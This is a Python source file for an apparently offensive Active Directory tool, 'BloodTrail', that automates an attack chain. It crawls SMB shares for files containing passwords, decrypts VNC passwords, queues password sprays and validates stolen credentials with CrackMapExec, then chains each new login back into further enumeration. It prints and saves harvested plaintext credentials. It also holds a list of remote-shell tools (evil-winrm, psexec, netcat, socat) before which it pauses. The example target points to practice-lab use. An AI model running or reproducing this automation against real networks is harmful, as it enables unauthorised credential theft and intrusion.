"""
BloodTrail Auto-Execute Orchestrator

Manages automatic attack chain execution:
1. Runs enumeration
2. Processes findings through recommendation engine
3. Auto-executes CRITICAL/HIGH recommendations
4. Chains new credentials back to enumeration
5. Pauses on manual steps with resume capability
"""

from dataclasses import dataclass, field
from datetime import datetime
from enum import Enum
from typing import List, Optional, Dict, Any, Callable
import json
import signal
import subprocess
import sys
from pathlib import Path

from ..recommendation import (
    RecommendationEngine,
    Recommendation,
    Finding,
    FindingType,
)
from ..recommendation.models import RecommendationPriority, Credential, CredentialType
from .output_parsers import parse_crackmapexec, parse_smbmap, ParsedOutput


class ExecutionStatus(Enum):
    """Status of auto-execution."""
    RUNNING = "running"
    PAUSED_MANUAL = "paused_manual"
    PAUSED_SHELL = "paused_shell"
    COMPLETED = "completed"
    INTERRUPTED = "interrupted"
    ERROR = "error"


@dataclass
class ExecutionResult:
    """Result of executing a recommendation."""
    recommendation_id: str
    success: bool
    output: str = ""
    error: str = ""
    new_credentials: List[Dict[str, str]] = field(default_factory=list)
    access_level: Optional[str] = None
    raw_input_id: Optional[str] = None  # Provenance: ID of persisted RawInput


@dataclass
class ChainState:
    """State of the attack chain for persistence/resume."""
    target: str
    domain: Optional[str] = None
    current_depth: int = 0
    max_depth: int = 5
    credentials: List[Dict[str, str]] = field(default_factory=list)
    completed_recommendations: List[str] = field(default_factory=list)
    pending_manual_steps: List[Dict[str, Any]] = field(default_factory=list)
    status: ExecutionStatus = ExecutionStatus.RUNNING
    started_at: str = field(default_factory=lambda: datetime.now().isoformat())
    ended_at: Optional[str] = None

    @property
    def validated_credentials(self) -> List[Dict[str, str]]:
        """Return credentials marked as validated."""
        return [c for c in self.credentials if c.get("validated", False)]

    def to_dict(self) -> Dict[str, Any]:
        """Serialize state for persistence."""
        return {
            "target": self.target,
            "domain": self.domain,
            "current_depth": self.current_depth,
            "max_depth": self.max_depth,
            "credentials": self.credentials,
            "completed_recommendations": self.completed_recommendations,
            "pending_manual_steps": self.pending_manual_steps,
            "status": self.status.value,
            "started_at": self.started_at,
            "ended_at": self.ended_at,
        }

    @classmethod
    def from_dict(cls, data: Dict[str, Any]) -> "ChainState":
        """Deserialize state from persistence."""
        state = cls(
            target=data["target"],
            domain=data.get("domain"),
            current_depth=data.get("current_depth", 0),
            max_depth=data.get("max_depth", 5),
            credentials=data.get("credentials", []),
            completed_recommendations=data.get("completed_recommendations", []),
            pending_manual_steps=data.get("pending_manual_steps", []),
            started_at=data.get("started_at", datetime.now().isoformat()),
            ended_at=data.get("ended_at"),
        )
        state.status = ExecutionStatus(data.get("status", "running"))
        return state


# ANSI colors
R = "\033[91m"  # Red
G = "\033[92m"  # Green
Y = "\033[93m"  # Yellow
B = "\033[94m"  # Blue
C = "\033[96m"  # Cyan
M = "\033[95m"  # Magenta
D = "\033[90m"  # Dim
X = "\033[0m"   # Reset
BOLD = "\033[1m"


class AutoOrchestrator:
    """
    Orchestrates automatic attack chain execution.

    Auto-executes all recon/enum/credential tests but pauses before:
    - Manual steps (AES decryption, .NET decompilation)
    - Shell access (WinRM, evil-winrm, nc)

    Usage:
        orchestrator = AutoOrchestrator(
            target="10.10.10.182",
            domain="CASCADE.LOCAL",
            auto_level=RecommendationPriority.HIGH,
        )
        state = orchestrator.run()
    """

    # Commands that indicate shell access - always pause before these
    SHELL_PATTERNS = [
        "evil-winrm",
        "winrm",
        "psexec",
        "wmiexec",
        "smbexec",
        "atexec",
        "dcomexec",
        "nc ",
        "netcat",
        "ncat",
        "socat",
        "reverse",
        "shell",
    ]

    def __init__(
        self,
        target: str,
        domain: Optional[str] = None,
        auto_level: RecommendationPriority = RecommendationPriority.HIGH,
        max_depth: int = 5,
        timeout: int = 180,
        verbose: bool = True,
        initial_credentials: Optional[List[Dict[str, str]]] = None,
        on_credential_found: Optional[Callable[[str, str, str], None]] = None,
        on_recommendation_complete: Optional[Callable[[Recommendation, bool], None]] = None,
    ):
        """
        Initialize the auto-orchestrator.

        Args:
            target: Target IP or hostname
            domain: AD domain name (auto-detected if not provided)
            auto_level: Minimum priority to auto-execute
            max_depth: Maximum credential chain depth
            timeout: Command timeout in seconds
            verbose: Whether to print progress
            initial_credentials: Credentials to inject (for resume)
            on_credential_found: Callback when credential validates
            on_recommendation_complete: Callback when recommendation completes
        """
        self.target = target
        self.domain = domain
        self.auto_level = auto_level
        self.max_depth = max_depth
        self.timeout = timeout
        self.verbose = verbose

        # Callbacks
        self._on_credential_found = on_credential_found
        self._on_recommendation_complete = on_recommendation_complete

        # Create recommendation engine
        self.engine = RecommendationEngine(target=target, domain=domain)

        # State tracking
        self.state = ChainState(
            target=target,
            domain=domain,
            max_depth=max_depth,
        )

        # Inject initial credentials if resuming
        if initial_credentials:
            for cred in initial_credentials:
                self._inject_credential(cred["username"], cred["password"])

        # Interrupt handling
        self._running = True
        self._original_sigint = signal.getsignal(signal.SIGINT)
        signal.signal(signal.SIGINT, self._handle_interrupt)

    def _handle_interrupt(self, signum, frame):
        """Graceful shutdown on Ctrl+C."""
        self._log(f"\n{Y}[!] Interrupt received - finishing current operation...{X}")
        self._running = False
        self.state.status = ExecutionStatus.INTERRUPTED

    def _log(self, message: str, color: str = "", bold: bool = False, dim: bool = False):
        """Print message if verbose mode enabled."""
        if not self.verbose:
            return

        prefix = ""
        if bold:
            prefix += BOLD
        if dim:
            prefix += D
        if color == "green":
            prefix += G
        elif color == "red":
            prefix += R
        elif color == "yellow":
            prefix += Y
        elif color == "cyan":
            prefix += C
        elif color == "blue":
            prefix += B
        elif color == "magenta":
            prefix += M

        suffix = X if prefix else ""
        print(f"{prefix}{message}{suffix}")

    def _inject_credential(self, username: str, password: str) -> None:
        """Inject a credential for resume mode."""
        self._log(f"  {C}Injecting credential: {username}{X}")

        # Add to engine state
        self.engine.add_credential(
            username=username,
            password=password,
            credential_type=CredentialType.PASSWORD,
            validated=True,  # Assume valid since user provided it
            access_level="user",
            source_finding="injected",
            domain=self.domain,
        )

        # Track in state
        self.state.credentials.append({
            "username": username,
            "password": password,
            "access_level": "user",
            "source": "injected",
        })

        self.state.current_depth += 1

    def run(self) -> ChainState:
        """
        Run the auto-execute loop.

        Returns:
            Final ChainState with results
        """
        self._print_banner()

        try:
            # Main loop
            while self._running and self.state.current_depth < self.max_depth:
                rec = self.engine.get_next_recommendation()

                if not rec:
                    self._log(f"\n{G}[*] No more recommendations{X}")
                    self.state.status = ExecutionStatus.COMPLETED
                    break

                # Skip if already completed
                if rec.id in self.state.completed_recommendations:
                    continue

                # Check if this should auto-execute
                if self._should_auto_execute(rec):
                    result = self._execute_recommendation(rec)
                    self._process_result(rec, result)
                else:
                    # Manual step or shell - pause
                    self._handle_pause(rec)
                    break

        except Exception as e:
            self._log(f"\n{R}[!] Error: {e}{X}")
            self.state.status = ExecutionStatus.ERROR

        finally:
            # Restore signal handler
            signal.signal(signal.SIGINT, self._original_sigint)

        self.state.ended_at = datetime.now().isoformat()
        self._print_summary()
        return self.state

    def _should_auto_execute(self, rec: Recommendation) -> bool:
        """Check if recommendation should auto-execute."""
        # Never auto-execute manual steps
        if rec.action_type == "manual_step":
            return False

        # Never auto-execute shells
        if self._is_shell_command(rec):
            return False

        # Check priority threshold
        return rec.priority.value <= self.auto_level.value

    def _is_shell_command(self, rec: Recommendation) -> bool:
        """Check if recommendation would give shell access."""
        # Check metadata flag
        if rec.metadata.get("is_shell"):
            return True

        # Check command for shell patterns
        if rec.command:
            cmd_lower = rec.command.lower()
            for pattern in self.SHELL_PATTERNS:
                if pattern in cmd_lower:
                    return True

        return False

    def _execute_recommendation(self, rec: Recommendation) -> ExecutionResult:
        """Execute a recommendation and capture results."""
        result = ExecutionResult(recommendation_id=rec.id, success=False)

        # Handle tool_use (internal tools)
        if rec.action_type == "tool_use":
            return self._execute_tool(rec)

        # Handle run_command
        if not rec.command:
            result.error = "No command to execute"
            return result

        # Verbose: Show command details
        self._log(f"\n{C}┌{'─' * 70}{X}")
        self._log(f"{C}│ EXECUTING: {rec.description}{X}")
        self._log(f"{C}└{'─' * 70}{X}")
        self._log(f"")
        self._log(f"  {D}Why:{X}       {rec.why[:80]}..." if rec.why and len(rec.why) > 80 else f"  {D}Why:{X}       {rec.why or 'N/A'}")
        self._log(f"  {D}Priority:{X}  {rec.priority.name}")
        self._log(f"")
        self._log(f"  {Y}Command:{X}")
        self._log(f"  {G}$ {rec.command}{X}")
        self._log(f"")

        try:
            self._log(f"  {D}Running...{X}")

            # Use captured_run for persistence (if enabled)
            try:
                from crack.tools.persistence import captured_run, PersistenceConfig
                if PersistenceConfig.is_enabled():
                    captured_result = captured_run(
                        rec.command,
                        shell=True,
                        timeout=self.timeout,
                        source_tool="bloodtrail",
                        source_module="auto.orchestrator",
                        target_ip=self.target,
                        target_domain=self.domain,
                        metadata={"recommendation_id": rec.id, "description": rec.description},
                    )
                    result.output = captured_result.output if isinstance(captured_result.output, str) else captured_result.raw_input.output_text
                    proc_returncode = captured_result.returncode
                    # Store raw_input_id for provenance
                    result.raw_input_id = captured_result.raw_input.id
                else:
                    # Persistence disabled - use plain subprocess
                    proc = subprocess.run(
                        rec.command,
                        shell=True,
                        capture_output=True,
                        text=True,
                        timeout=self.timeout,
                    )
                    result.output = proc.stdout + proc.stderr
                    proc_returncode = proc.returncode
            except ImportError:
                # Persistence module not available - fallback to plain subprocess
                proc = subprocess.run(
                    rec.command,
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=self.timeout,
                )
                result.output = proc.stdout + proc.stderr
                proc_returncode = proc.returncode

            # Verbose: Show raw output (truncated)
            self._log(f"  {D}Exit code: {proc_returncode}{X}")
            if result.output.strip():
                self._log(f"")
                self._log(f"  {D}Output:{X}")
                output_lines = result.output.strip().split('\n')
                for line in output_lines[:20]:  # Show first 20 lines
                    # Highlight success indicators
                    if '[+]' in line or 'Pwn3d' in line:
                        self._log(f"  {G}│ {line}{X}")
                    elif '[-]' in line or 'ERROR' in line.upper() or 'FAIL' in line.upper():
                        self._log(f"  {R}│ {line}{X}")
                    else:
                        self._log(f"  {D}│ {line}{X}")
                if len(output_lines) > 20:
                    self._log(f"  {D}│ ... ({len(output_lines) - 20} more lines){X}")
            self._log(f"")

            # Parse output based on command type
            result = self._parse_output(rec, result)

        except subprocess.TimeoutExpired:
            result.error = f"Command timed out after {self.timeout}s"
            self._log(f"  {R}[!] {result.error}{X}")
        except Exception as e:
            result.error = str(e)
            self._log(f"  {R}[!] Error: {e}{X}")

        return result

    def _execute_tool(self, rec: Recommendation) -> ExecutionResult:
        """Execute an internal tool action."""
        result = ExecutionResult(recommendation_id=rec.id, success=False)
        tool_type = rec.metadata.get("tool")

        self._log(f"\n{C}[*] Running tool: {rec.description}{X}")

        if tool_type == "smb_crawler":
            return self._run_smb_crawler(rec)
        elif tool_type == "vnc_decrypt":
            return self._run_vnc_decrypt(rec)
        else:
            result.error = f"Unknown tool type: {tool_type}"
            self._log(f"    {R}[!] {result.error}{X}")

        return result

    def _run_smb_crawler(self, rec: Recommendation) -> ExecutionResult:
        """Execute SMB crawl and process results."""
        result = ExecutionResult(recommendation_id=rec.id, success=False)

        try:
            from ..enumerators.smb_crawler import SMBCrawler
            from ..recommendation.smb_integration import process_smb_crawl

            username = rec.metadata.get("username")
            password = rec.metadata.get("password", "")  # Allow empty password for guest
            domain = rec.metadata.get("domain") or self.domain or ""
            pwd_display = password if password else "(empty)"

            if not username:
                result.error = "Missing username for SMB crawl"
                return result

            # Verbose: Show connection details
            self._log(f"\n    {C}┌{'─' * 60}{X}")
            self._log(f"    {C}│ SMB SHARE CRAWL{X}")
            self._log(f"    {C}└{'─' * 60}{X}")
            self._log(f"    {D}Target:{X}      {self.target}")
            self._log(f"    {D}Username:{X}    {username}")
            self._log(f"    {D}Password:{X}    {pwd_display}")
            self._log(f"    {D}Domain:{X}      {domain or '(none)'}")
            self._log("")

            # Verbose: Show equivalent command
            if domain:
                equiv_cmd = f"smbclient -L //{self.target} -U '{domain}\\{username}%{password}'"
            else:
                equiv_cmd = f"smbclient -L //{self.target} -U '{username}%{password}'"
            self._log(f"    {D}Equivalent:{X} {equiv_cmd}")
            self._log("")

            crawler = SMBCrawler(
                host=self.target,
                username=username,
                password=password,
                domain=domain,
            )

            with crawler:
                # Verbose: List shares first
                self._log(f"    {Y}[1/3] Listing accessible shares...{X}")
                shares = crawler.list_shares_detailed()
                if shares:
                    self._log(f"    {G}Found {len(shares)} shares:{X}")
                    for share in shares:
                        name = share.name if hasattr(share, 'name') else str(share)
                        # Build access string from readable/writable flags
                        access_parts = []
                        if hasattr(share, 'readable') and share.readable:
                            access_parts.append('READ')
                        if hasattr(share, 'writable') and share.writable:
                            access_parts.append('WRITE')
                        access = ', '.join(access_parts) if access_parts else 'NO ACCESS'
                        access_color = G if access_parts else D
                        self._log(f"           {access_color}├─ {name:<20} [{access}]{X}")
                else:
                    self._log(f"    {R}No accessible shares found{X}")
                self._log("")

                # Verbose: Crawl shares
                self._log(f"    {Y}[2/3] Crawling shares for interesting files...{X}")
                crawl_result = crawler.crawl_and_extract(
                    auto_download=True,
                    min_score=30,
                )

            # Verbose: Show files found
            total_files = len(crawl_result.files) if crawl_result.files else 0
            self._log(f"    {G}Found {total_files} interesting files:{X}")
            if crawl_result.files:
                # Group by share
                files_by_share = {}
                for f in crawl_result.files:
                    share = getattr(f, 'source', 'unknown').split('/')[-1] if hasattr(f, 'source') else 'unknown'
                    if share not in files_by_share:
                        files_by_share[share] = []
                    files_by_share[share].append(f)

                for share, files in files_by_share.items():
                    self._log(f"           {C}[{share}]{X}")
                    for f in files[:10]:  # Show up to 10 per share
                        fname = getattr(f, 'filename', getattr(f, 'path', 'unknown'))
                        score = getattr(f, 'interesting_score', 0)
                        score_color = G if score >= 60 else Y if score >= 30 else D
                        self._log(f"           {score_color}├─ {fname} (score:{score}){X}")
                    if len(files) > 10:
                        self._log(f"           {D}└─ ... and {len(files) - 10} more{X}")
            self._log("")

            # Verbose: Parse files for credentials
            self._log(f"    {Y}[3/3] Parsing files for credentials...{X}")

            # Process with full integration (includes credential extraction)
            summary = process_smb_crawl(crawl_result, self.target, domain)

            # Verbose: Show credentials found
            if summary.credentials_extracted > 0:
                self._log(f"    {G}{'═' * 50}{X}")
                self._log(f"    {G}  CREDENTIALS EXTRACTED: {summary.credentials_extracted}{X}")
                self._log(f"    {G}{'═' * 50}{X}")

                # Show each credential with its source
                for finding in summary.findings:
                    if finding.finding_type.name == 'CREDENTIAL':
                        pwd = finding.metadata.get('password', finding.raw_value)
                        src = finding.metadata.get('cred_source', finding.target)
                        notes = finding.metadata.get('notes', '')[:60]
                        self._log(f"    {G}Password:{X}  {B}{pwd}{X}")
                        self._log(f"    {D}Source:{X}    {src}")
                        self._log(f"    {D}Context:{X}   {notes}...")
                        self._log("")
            else:
                self._log(f"    {D}No credentials extracted from files{X}")
            self._log("")

            # Add findings to engine
            for finding in summary.findings:
                self.engine.add_finding(finding)

            # Add any generated recommendations to engine
            for new_rec in summary.recommendations:
                self.engine.state.pending_recommendations.append(new_rec)
                if 'spray' in new_rec.id.lower():
                    pwd = new_rec.metadata.get('password', '?')[:20]
                    self._log(f"    {C}[+] Queued: Password spray with '{pwd}...'{X}")

            self._log(f"    {D}Generated {len(summary.findings)} findings for recommendation engine{X}")
            result.success = True

        except ImportError as e:
            result.error = "SMB crawler not available (missing impacket?)"
            self._log(f"    {R}[!] {result.error}{X}")
            self._log(f"    {D}Import error: {e}{X}")
        except Exception as e:
            result.error = f"SMB crawl failed: {e}"
            self._log(f"    {R}[!] {result.error}{X}")
            import traceback
            self._log(f"    {D}Traceback:{X}")
            for line in traceback.format_exc().split('\n')[-6:]:
                if line.strip():
                    self._log(f"    {D}│ {line}{X}")

        return result

    def _run_vnc_decrypt(self, rec: Recommendation) -> ExecutionResult:
        """Decrypt VNC password using known DES key."""
        result = ExecutionResult(recommendation_id=rec.id, success=False)

        try:
            from ..recommendation.decoders import decrypt_vnc_password

            encrypted_hex = rec.metadata.get("encrypted_password")
            if not encrypted_hex:
                result.error = "No encrypted password in metadata"
                return result

            decrypted = decrypt_vnc_password(encrypted_hex)
            if decrypted:
                self._log(f"    {G}Decrypted: {decrypted}{X}")
                result.success = True
                result.output = decrypted

                # Create credential finding
                username = rec.metadata.get("inferred_user", "unknown")
                self.engine.add_credential(
                    username=username,
                    password=decrypted,
                    credential_type=CredentialType.PASSWORD,
                    validated=False,
                    source_finding=rec.trigger_finding_id,
                )
                result.new_credentials.append({
                    "username": username,
                    "password": decrypted,
                })
            else:
                result.error = "VNC decryption failed"

        except Exception as e:
            result.error = f"VNC decrypt failed: {e}"

        return result

    def _parse_output(self, rec: Recommendation, result: ExecutionResult) -> ExecutionResult:
        """Parse command output for success indicators and new data."""
        output = result.output
        cmd = rec.command or ""

        # CrackMapExec credential validation
        if "crackmapexec" in cmd or "cme " in cmd or "netexec" in cmd:
            parsed = parse_crackmapexec(output)
            result.success = parsed.success
            result.access_level = parsed.access_level

            username = rec.metadata.get("username", "")
            password = rec.metadata.get("password", "")

            if parsed.success:
                self._log(f"    {G}[+] VALID: {username} ({parsed.access_level}){X}")

                # Add validated credential
                self.engine.add_credential(
                    username=username,
                    password=password,
                    credential_type=CredentialType.PASSWORD,
                    validated=True,
                    access_level=parsed.access_level,
                    source_finding=rec.trigger_finding_id,
                    domain=self.domain,
                )

                result.new_credentials.append({
                    "username": username,
                    "password": password,
                    "access_level": parsed.access_level,
                })

                # Track in state
                self.state.credentials.append({
                    "username": username,
                    "password": password,
                    "access_level": parsed.access_level,
                    "source": rec.id,
                })

                # Callback
                if self._on_credential_found:
                    self._on_credential_found(username, password, parsed.access_level)

                # Increment depth
                self.state.current_depth += 1

            else:
                self._log(f"    {R}[-] INVALID: {username}{X}")

        # SMBMap share enumeration
        elif "smbmap" in cmd:
            parsed = parse_smbmap(output)
            result.success = parsed.success
            if parsed.success:
                self._log(f"    {G}[+] Found {len(parsed.shares)} accessible shares{X}")
            else:
                self._log(f"    {Y}[-] No accessible shares{X}")

        # Default: assume success if no errors
        else:
            result.success = "error" not in output.lower() and result.output.strip() != ""

        return result

    def _process_result(self, rec: Recommendation, result: ExecutionResult) -> None:
        """Process execution result and update state."""
        # Mark recommendation as complete
        self.engine.complete_recommendation(rec.id)
        self.state.completed_recommendations.append(rec.id)

        # Callback
        if self._on_recommendation_complete:
            self._on_recommendation_complete(rec, result.success)

        # Process on_success / on_failure chains
        if result.success and rec.on_success:
            self._queue_chained_recommendations(rec, rec.on_success, result)
        elif not result.success and rec.on_failure:
            self._queue_chained_recommendations(rec, rec.on_failure, result)

    def _queue_chained_recommendations(
        self,
        source_rec: Recommendation,
        templates: List[str],
        result: ExecutionResult,
    ) -> None:
        """Queue follow-up recommendations from on_success/on_failure chains."""
        for template_name in templates:
            self._log(f"    {D}Queueing: {template_name}{X}")
            # The engine should handle this via the valid_credential trigger

    def _handle_pause(self, rec: Recommendation) -> None:
        """Handle recommendation requiring user intervention."""
        if rec.action_type == "manual_step":
            self.state.status = ExecutionStatus.PAUSED_MANUAL
            reason = "Manual Step Required"
        else:
            self.state.status = ExecutionStatus.PAUSED_SHELL
            reason = "Shell Access - Confirm Before Proceeding"

        self._log(f"\n{'='*74}")
        self._log(f"{Y}{BOLD}{reason}{X}")
        self._log(f"{'='*74}")
        self._log(f"\n{rec.description}")

        if rec.why:
            self._log(f"\n{D}Why: {rec.why}{X}")

        if rec.command:
            self._log(f"\n{C}Command:{X}")
            self._log(f"  {G}$ {rec.command}{X}")

        # Store for resume
        self.state.pending_manual_steps.append({
            "id": rec.id,
            "description": rec.description,
            "command": rec.command,
            "why": rec.why,
            "action_type": rec.action_type,
        })

        self._log(f"\n{C}To resume with discovered credentials:{X}")
        self._log(f"  {G}crack bloodtrail {self.target} --auto --cred USER:PASS{X}")

    def _print_banner(self) -> None:
        """Print startup banner."""
        self._log(f"\n{C}{BOLD}BloodTrail Auto-Attack{X}")
        self._log(f"{D}{'─'*40}{X}")
        self._log(f"  Target: {self.target}")
        if self.domain:
            self._log(f"  Domain: {self.domain}")
        self._log(f"  Auto-level: {self.auto_level.name}")
        self._log(f"  Max depth: {self.max_depth}")
        self._log(f"{D}{'─'*40}{X}\n")

    def _print_summary(self) -> None:
        """Print execution summary."""
        self._log(f"\n{D}{'─'*40}{X}")
        self._log(f"{C}{BOLD}Execution Summary{X}")
        self._log(f"{D}{'─'*40}{X}")
        self._log(f"  Status: {self.state.status.value}")
        self._log(f"  Depth: {self.state.current_depth}/{self.max_depth}")
        self._log(f"  Completed: {len(self.state.completed_recommendations)} actions")
        self._log(f"  Credentials: {len(self.state.credentials)} found")

        if self.state.credentials:
            self._log(f"\n{G}Validated Credentials:{X}")
            for cred in self.state.credentials:
                access = cred.get("access_level", "unknown")
                self._log(f"  {cred['username']}:{cred['password']} ({access})")

        if self.state.pending_manual_steps:
            self._log(f"\n{Y}Pending Manual Steps:{X}")
            for step in self.state.pending_manual_steps:
                self._log(f"  - {step['description']}")

    def save_state(self, path: Optional[Path] = None) -> Path:
        """Save state for resume."""
        if path is None:
            state_dir = Path.home() / ".crack" / "auto_state"
            state_dir.mkdir(parents=True, exist_ok=True)
            safe_target = self.target.replace(".", "_").replace(":", "_")
            path = state_dir / f"{safe_target}.json"

        with open(path, "w") as f:
            json.dump(self.state.to_dict(), f, indent=2)

        self._log(f"\n{D}State saved to: {path}{X}")
        return path

    @classmethod
    def load_state(cls, path: Path) -> "AutoOrchestrator":
        """Load orchestrator from saved state."""
        with open(path) as f:
            data = json.load(f)

        state = ChainState.from_dict(data)
        orchestrator = cls(
            target=state.target,
            domain=state.domain,
            max_depth=state.max_depth,
            initial_credentials=state.credentials,
        )
        orchestrator.state = state
        return orchestrator
